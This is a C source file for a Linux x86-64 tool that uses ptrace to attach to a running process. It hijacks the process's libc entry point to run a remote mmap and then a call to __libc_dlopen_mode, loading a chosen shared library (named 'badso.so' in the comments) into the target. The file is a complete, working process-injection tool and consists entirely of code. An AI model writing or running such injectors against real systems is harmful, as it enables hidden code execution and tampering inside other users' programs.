#include <stdio.h>
#include <stdint.h>
#include <elf.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

#define X86_64_SYS_MMAP		9
#define X86_64_SYS_MUNMAP	11

#define MAXPROCPATH		0x40
#define MAXSYMNAME		0x80
#define DLOPENSYMNAME	"__libc_dlopen_mode"
#define STACKSIZE		0x1000 //0x1000-0x100000+ should all work - 1+ page(s) to prevent stack clobbering/rsp out-of-bounds

#define SYSCALLCODE		0xCC050F
#define CALLCODE		0xCCD0FF
#define SYSCALLCODEMASK		(~0xffffff)
#define CALLCODEMASK		(~0xffffff)

int getTargetInfo(pid_t pid, void** out_libc_entry, void** out_dlopen);
int openTargetLibc(pid_t pid, FILE** out_file, void** out_addr);
int ptraceContinueWait(pid_t pid, struct user_regs_struct* out_regs);

int main(int argc, char* argv[]) {
	int err = 0;
	int status = 0;
	pid_t pid = 0;
	
	void* targ_libc_entry = NULL;
	void* targ_dlopen = NULL;

	struct user_regs_struct savedregs = {0};
	struct user_regs_struct reqregs = {0};

	uint64_t mappedloc = 0x0;

	if (argc < 3) {
		printf("Usage: %s target_pid /path/to/injection.so\n", argv[0]);
		err = -1;
		goto END;
	}

	pid = strtol(argv[1], NULL, 10);

	size_t pathareasz = getpagesize(); // platform page size == 4096B
	fprintf(stderr, "getpagesize/pathareasz: %zu\n", pathareasz); 
	size_t pathlen = 0; // length of badso.so == 8
	pathlen = strlen(argv[2]);

	if (pathlen == 0 || pathlen > pathareasz) {
		printf("Invalid .so path\n");
		err = -1;
		goto END;
	}
	fprintf(stderr, "pathlen: %zu\n", pathlen);

	// attach
	if (ptrace(PTRACE_ATTACH, pid, 0, 0)) {
		printf("Could not attach to %d. %s\n", pid, strerror(errno));
		err = errno;
		goto END;
	}
	
	// wait until the attach works
	do {
		err = waitpid(pid, &status, 0);
	} while (err == -1 && errno == EINTR);
	
	if (err == -1) {
		printf("waitpid err while waiting for attach. %s\n", strerror(errno));
		err = errno;
		goto END_DETACH;
	}
	err = 0;
	
	// get information about target libc
	err = getTargetInfo(pid, &targ_libc_entry, &targ_dlopen);
	if (err) {
		printf("Could not get target info.\n");
		goto END_DETACH;
	}

	fprintf(stderr, "Found target's dlopen at 0x%016lx\n", (uint64_t)targ_dlopen);
	fprintf(stderr, "Found target's libc entry at 0x%016lx\n", (uint64_t)targ_libc_entry);

	// save target state
	if (ptrace(PTRACE_GETREGS, pid, 0, &savedregs)) {
		printf("Could not save register state. %s\n", strerror(errno));
		goto END_DETACH;
	}

	fprintf(
		stderr,
		"savedregs before mmap syscall:\nrip 0x%016llx\nrbp 0x%016llx\nrsp 0x%016llx\nrax 0x%016llx\nrdi 0x%016llx\nrsi 0x%016llx\n",
		savedregs.rip,
		savedregs.rbp,
		savedregs.rsp,
		savedregs.rax,
		savedregs.rdi,
		savedregs.rsi
	);

	errno = 0;
	long savedcode = 0;	
	savedcode = ptrace(PTRACE_PEEKTEXT, pid, targ_libc_entry, NULL);
	if (errno) {
		printf("Could not read code to be clobbered. %s\n", strerror(errno));
		err = errno;
		goto END_DETACH;
	}
	fprintf(stderr, "before syscall poketext - savedcode = %p\n", (void*)savedcode);

	// map path area and stack
	long reqcode = 0;
	reqcode = savedcode & SYSCALLCODEMASK; // two lines == masking to guarantee only 3 bytes for writing
	reqcode |= SYSCALLCODE; 
	fprintf(stderr, "before syscall poketext - reqcode = %p\n", (void*)reqcode);

	if (ptrace(PTRACE_POKETEXT, pid, targ_libc_entry, reqcode)) {
		printf("Could not write syscall code. %s\n", strerror(errno));
		err = errno;
		goto END_DETACH;
	}

	savedcode = ptrace(PTRACE_PEEKTEXT, pid, targ_libc_entry, NULL);
	if (errno) {
		printf("Could not read clobbered code. %s\n", strerror(errno));
		err = errno;
		goto END_DETACH;
	}
	fprintf(stderr, "after syscall poketext - savedcode = %p\n", (void*)savedcode);

	// setup registers for system call
	reqregs = savedregs;
	reqregs.rip = (uint64_t)targ_libc_entry;
	// mmap(addr<rdi>, len<rsi>, prot<rdx>, flags<r10>, fd<r8>, off<r9>)
	reqregs.rax = X86_64_SYS_MMAP;
	reqregs.rdi = 0;
	reqregs.rsi = STACKSIZE + pathareasz; // 0x100000 + 0x1000
	reqregs.rdx = PROT_READ | PROT_WRITE;
	//reqregs.r10 = MAP_ANONYMOUS; // <-- won't work alone - needs MAP_PRIVATE;
	reqregs.r10 = MAP_ANONYMOUS | MAP_PRIVATE; // MAP_PRIVATE removes parent's need-to-know/access
	reqregs.r8  = -1;
	reqregs.r9  = 0;

	if (ptrace(PTRACE_SETREGS, pid, 0, &reqregs)) {
		printf("Could not set registers before mmap. %s\n", strerror(errno));
		err = errno;
		goto END_RESTORE;
	}

	fprintf(
		stderr,
		"reqregs after PTRACE_SETREGS before syscall to mmap:\nrip 0x%016llx\nrbp 0x%016llx\nrsp 0x%016llx\nrax 0x%016llx\nrdi 0x%016llx\nrsi 0x%016llx\n",
		reqregs.rip,
		reqregs.rbp,
		reqregs.rsp,
		reqregs.rax,
		reqregs.rdi,
		reqregs.rsi
	);

	err = ptraceContinueWait(pid, &reqregs);
	if (err) {
		printf("Unable to complete remote mmap.\n");
		goto END_UNMAP;
	}

	mappedloc = reqregs.rax;
	fprintf(stderr, "Mapped memory at 0x%016lx\n", mappedloc);

	// write ./badso.so path 0x100000 (STACKSIZE) into mappedloc
	int i = 0;
	reqcode = 0;
	for (i = 0; i <= pathlen; i++) {
		reqcode = argv[2][i];
		fprintf(stderr, "argv[2][%d]:%x-%c\n", i, (int)reqcode, (int)reqcode);
		if (ptrace(PTRACE_POKEDATA, pid, mappedloc + STACKSIZE + i, reqcode)) {
			printf("Could not write path character %d. %s\n", i, strerror(errno));
			err = errno;
			goto END_UNMAP;
		}
	}

	long saved_path = 0;	
	saved_path = ptrace(PTRACE_PEEKDATA, pid, mappedloc + STACKSIZE, NULL); 
	// ^^ 0x6f732e6f73646162 = os.osdab (badso.so in little endian)
	if (errno) {
		printf("Could not read clobbered code. %s\n", strerror(errno));
		err = errno;
		goto END_DETACH;
	}
	fprintf(stderr, "after mmap - saved_path = %p\n", (void*)saved_path);

	savedcode = ptrace(PTRACE_PEEKTEXT, pid, targ_libc_entry, NULL);
	if (errno) {
		printf("Could not read code to be clobbered. %s\n", strerror(errno));
		err = errno;
		goto END_DETACH;
	}
	fprintf(stderr, "before dlopen poketext - savedcode = %p\n", (void*)savedcode);

	// remote call dlopen
	reqcode = savedcode & CALLCODEMASK;
	reqcode |= CALLCODE;
	fprintf(stderr, "reqcode before dlopen poketext: %p\n", (void*)reqcode);
	if (ptrace(PTRACE_POKETEXT, pid, targ_libc_entry, reqcode)) {
		printf("Could not write dlopen call code. %s\n", strerror(errno));
		err = errno;
		goto END_UNMAP;
	}
	
	savedcode = ptrace(PTRACE_PEEKTEXT, pid, targ_libc_entry, NULL); 
	fprintf(stderr, "after poketext of dlopen opcode - savedcode = %p\n", (void*)savedcode);
	if (errno) {
		printf("Could not read clobbered code. %s\n", strerror(errno));
		err = errno;
		goto END_DETACH;
	}

	// setup register for dlopen call
	reqregs = savedregs;
	reqregs.rip = (uint64_t)targ_libc_entry; // return to 0xCC
	reqregs.rsp = mappedloc + (STACKSIZE - 0x10); // -0x10 == space needed for call (push rip, push rbp)
	// ^^ offset into the mmapped 'stack' - shouldn't conflict with the .so path (-0xXX can be more than -0x10)
	reqregs.rax = (uint64_t)targ_dlopen; // address of __libc_dlopen_mode()
	//__libc_dlopen_mode(path<rdi>, flags<rsi>)
	reqregs.rdi = mappedloc + STACKSIZE; // location of badso.so
	reqregs.rsi = RTLD_LAZY;

	//DEBUG
	// if we wanted to debug here, we could print out the regs
	// then just reset the registers back to previous and detach
	// then we can attach with gdb, and set the registers, then step through 
	printf(
		"reqregs for call to dlopen:\nrip 0x%016llx\nrbp 0x%016llx\nrsp 0x%016llx\nrax 0x%016llx\nrdi 0x%016llx\nrsi 0x%016llx\n",
		reqregs.rip,
		reqregs.rbp,
		reqregs.rsp,
		reqregs.rax,
		reqregs.rdi,
		reqregs.rsi
	);

	if (ptrace(PTRACE_SETREGS, pid, 0, &reqregs)) {
		printf("Could not set registers before dlopen. %s\n", strerror(errno));
		err = errno;
		goto END_UNMAP;
	}

	err = ptraceContinueWait(pid, &reqregs);
	if (err) {
		printf("Unable to complete remote dlopen.\n");
		goto END_UNMAP;
	}

	printf("Dlopen on target returned 0x%llx\n", reqregs.rax);
	
END_UNMAP:	
	// unmap
	reqcode = savedcode & SYSCALLCODEMASK;
	reqcode |= SYSCALLCODE; 
	if (ptrace(PTRACE_POKETEXT, pid, targ_libc_entry, reqcode)) {
		printf("Could not write syscall code before munmap. %s\n", strerror(errno));
		err = errno;
		goto END_RESTORE;
	}

	// setup registers for system call
	reqregs = savedregs;
	reqregs.rip = (uint64_t)targ_libc_entry;
	// mumap(addr<rdi>, len<rsi>)
	reqregs.rax = X86_64_SYS_MUNMAP;
	reqregs.rdi = mappedloc;
	reqregs.rsi = STACKSIZE + pathareasz; // hope stack didn't grow

	if (ptrace(PTRACE_SETREGS, pid, 0, &reqregs)) {
		printf("Could not set registers before munmap. %s\n", strerror(errno));
		err = errno;
		goto END_RESTORE;
	}

	err = ptraceContinueWait(pid, &reqregs);
	if (err) {
		printf("Unable to complete remote munmap.\n");
		goto END_RESTORE;
	}

	if (reqregs.rax) {
		printf("Remote munmap errored.\n");
		goto END_RESTORE;
	}
	

END_RESTORE:
	// restore memory
	if (ptrace(PTRACE_POKETEXT, pid, targ_libc_entry, savedcode)) {
		printf("Could not write back entry code. %s\n", strerror(errno));
		err = errno;
	}

	// restore regs
	if (ptrace(PTRACE_SETREGS, pid, 0, &savedregs)) {
		printf("Could not set registers to restore. %s\n", strerror(errno));
		err = errno;
	}
		
END_DETACH:	
	// detach
	if (ptrace(PTRACE_DETACH, pid, 0, 0)) {
		printf("Could not properly detatch. %s\n", strerror(errno));
		err = errno;
	}
END:
	printf("Done. Err 0x%x\n", err);
	return err;
}


int getTargetInfo(pid_t pid, void** out_libc_entry, void** out_dlopen) {
	int err = 0;
	FILE* flibc = NULL;
	void* libcbase = NULL;
	Elf64_Ehdr ehdr = {0};
	Elf64_Shdr shdr = {0};
	Elf64_Sym sym = {0};
	Elf64_Off secnamesoff = 0x0;
	Elf64_Off dstroff = 0x0;
	Elf64_Xword dstrsz = 0;
	Elf64_Off dsymoff = 0x0;
	Elf64_Xword dsymsz = 0;
	Elf64_Xword dsymentsz = 0;
	Elf64_Addr dlopenoff = 0;
	uint64_t i = 0;
	fpos_t pos = {0};
	char namebuf[MAXSYMNAME] = {0};

	// open libc and get base
	err = openTargetLibc(pid, &flibc, &libcbase);
	if (err) {
		printf("Could not open target libc.\n");
		goto END;
	}

	// read in the elf header
	if (1 != fread(&ehdr, sizeof(ehdr), 1, flibc)) {
		printf("Unable to read libc elf header\n");
		err = -1;
		goto END;
	}

	err = fseek(flibc, ehdr.e_shoff + (ehdr.e_shstrndx * ehdr.e_shentsize), SEEK_SET);
	if (err) {
		printf("Unable to seek to shstr section header\n");
		goto END;
	}
	
	if (1 != fread(&shdr, sizeof(shdr), 1, flibc)) {
		printf("Unable to read libc str section header\n");
		err = -1;
		goto END;
	}
	
	secnamesoff = shdr.sh_offset;
	
	// find .dynstr and .dynsym sections
	err = fseek(flibc, ehdr.e_shoff, SEEK_SET);
	if (err) {
		printf("Unable to seek to section header table\n");
		goto END;
	}
	
	for (i = 0; i < ehdr.e_shnum; i++) {
		if (1 != fread(&shdr, sizeof(shdr), 1, flibc)) {
			printf("Unable to read libc section header 0x%lx\n", i);
			err = -1;
			goto END;
		}
		
		// look for .dynsym and .dynstr
		if (shdr.sh_type == SHT_STRTAB || shdr.sh_type == SHT_DYNSYM) {
			// seek to the section names to read the name
			err = fgetpos(flibc, &pos);
			if (err) {
				printf("Unable to get position.\n");
				goto END;
			}

			err = fseek(flibc, secnamesoff + shdr.sh_name, SEEK_SET);
			if (err) {
				printf("Unable to seek to sh_name.\n");
				goto END;
			}

			if (!fgets(namebuf, sizeof(namebuf), flibc)) {
				printf("Unable to read section name\n");
				err = -1;
				goto END;
			}
			
			err = fsetpos(flibc, &pos);
			if (err) {
				printf("Unable to set position.\n");
				goto END;
			}

			// test string
				
			if (shdr.sh_type == SHT_STRTAB && !strcmp(namebuf, ".dynstr")) {
				// found .dynstr
				// save off the offset and size, so we can find the symbol later
				dstroff = shdr.sh_offset;
				dstrsz = shdr.sh_size;
			} else if (shdr.sh_type == SHT_DYNSYM && !strcmp(namebuf, ".dynsym")) {
				// found .dynsym
				// save off the offset and size, so we can find the symbol later
				dsymoff = shdr.sh_offset;
				dsymsz = shdr.sh_size;
				dsymentsz = shdr.sh_entsize;
			}
		}
		if (dsymoff && dstroff) {
			break;
		}
	}

	if (!dsymoff || !dstroff) {
		printf("Did not find .dynstr andor .dynsym\n");
		err = -1;
		goto END;
	}
	
	err = fseek(flibc, dsymoff, SEEK_SET);
	if (err) {
		printf("Got a bad .dynsym offset\n");
		goto END;
	}
	
	// find the entry in the .dynsym that references to "__libc_dlopen_mode" in .dynstr
	for (i = 0; i < (dsymsz / dsymentsz); i++) {
		if (1 != fread(&sym, sizeof(sym), 1, flibc)) {
			printf("Unable to read symbol 0x%lx / 0x%lx\n", i, (dsymsz / dsymentsz));
			err = -1;
			goto END;
		}

		if (sym.st_name >= dstrsz) {
			err = -1;
			printf("Bad symbol name offset\n");
			goto END;
		}

		// read at it's st_name
		err = fgetpos(flibc, &pos);
		if (err) {
			printf("Unable to get position.\n");
			goto END;
		}

		err = fseek(flibc, dstroff + sym.st_name, SEEK_SET);
		if (err) {
			printf("Unable to seek to sh_name.\n");
			goto END;
		}

		if (!fgets(namebuf, sizeof(namebuf), flibc)) {
			printf("Unable to read symbol name\n");
			err = -1;
			goto END;
		}
		
		if (!strcmp(namebuf, DLOPENSYMNAME)) {
			// found the symbol!
			dlopenoff = sym.st_value;
			break;
		}

		err = fsetpos(flibc, &pos);
		if (err) {
			printf("Unable to set position.\n");
			goto END;
		}
	}

	if (!dlopenoff) {
		printf("Did not find dlopen in libc symbols\n");
		err = -1;
		goto END;
	}


	// save out dlopen
	*out_dlopen = (void*)(dlopenoff + libcbase);
	
	// save out libc entry (unlikely to be used by something else)
	*out_libc_entry = (void*)(ehdr.e_entry + libcbase);
	
END:
	if (flibc) {
		fclose(flibc);
	}

	return err;
}


int openTargetLibc(pid_t pid, FILE** out_file, void** out_addr) {
	int err = 0;
	char procpath[MAXPROCPATH] = {0};
	FILE* fprocmaps = NULL;
	FILE* flibc = NULL;
	char* line = NULL;
	size_t len = 0;
	ssize_t nread = 0;
	uint64_t startaddr = 0x0;
	char* foundpath = NULL;
	char* libcpath = NULL;
	int scancount = 0;
	

	// open /proc/<pid>/maps to find the correct libc
	if ((MAXPROCPATH - 1) <= snprintf(procpath, MAXPROCPATH-1, "/proc/%d/maps", pid)) {
		printf("Error, proc path too big\n");
		err = -1;
		goto END;
	}

	fprocmaps = fopen(procpath, "r");
	if (!fprocmaps) {
		printf("Unable to open %s. %s", procpath, strerror(errno));
		err = errno;
		goto END;
	}

	// parse out the desired line
	while ((nread = getline(&line, &len, fprocmaps)) != -1) {
		// find needed line
		scancount = sscanf(
			line,
			"%lx-%*x %*s %*x %*x:%*x %*d %ms",
			&startaddr,
			&libcpath
		);
		// if it parsed correctly, check that it is libc, and a .so file
		if (scancount == 2) {
			if (strstr(libcpath, "libc-2.") && strstr(libcpath, ".so")) {
				break;		
			}
		}
		if (libcpath != NULL) {
			free(libcpath);
			libcpath = NULL;
		}
	}
	
	if (!libcpath) {
		printf("Unable to find libc path in maps\n");
		err = -1;
		goto END;
	}

	// open that libc
	printf("Found %s at 0x%016lx\n", libcpath, startaddr);
	
	flibc = fopen(libcpath, "r");
	if (!flibc) {
		printf("Unable to open %s. %s\n", libcpath, strerror(errno));
		err = errno;
		goto END;
	}
	printf("fopen for read on libcpath successful\n");
	*out_file = flibc;
	*out_addr = (void*)startaddr;

END:
	if (line) {
		free(line);
	}
	if (foundpath) {
		free(foundpath);
	}
	if (libcpath) {
		free(libcpath);
	}
	if (fprocmaps) {
		fclose(fprocmaps);
	}
	
	return err;
}


int ptraceContinueWait(pid_t pid, struct user_regs_struct* out_regs) {
	int err = 0;
	int status = 0;

	if (ptrace(PTRACE_CONT, pid, 0, 0)) {
		printf("Unable to continue target. %s\n", strerror(errno));
		err = -1;
		goto END;
	}

	// wait for sigtrap
	do {
		err = waitpid(pid, &status, 0);
	} while (err == -1 && errno == EINTR);
	if (err == -1) {
		printf("Error while waiting for target. %s\n", strerror(errno));
		goto END; 
	}
	err = 0;

	if (!WIFSTOPPED(status) || (WSTOPSIG(status) != SIGTRAP)) {
		if (WIFSTOPPED(status)) {
			printf("Unexpected stop %d\n", WSTOPSIG(status));
		}
		if (WIFEXITED(status)) {
			printf("Unexpected exit with status %d\n", WEXITSTATUS(status));
		}
		if (WIFSIGNALED(status)) {
			printf("Unexpected signal %d\n", WTERMSIG(status));
		}
		printf("Error, got unexpected status waiting for target\n");
		err = -1;
		goto END;
	}

	// get response
	if (ptrace(PTRACE_GETREGS, pid, 0, out_regs)) {
		printf("Could not get target response. %s\n", strerror(errno));
		err = -1;
		goto END;
	}

END:
	return err;
}
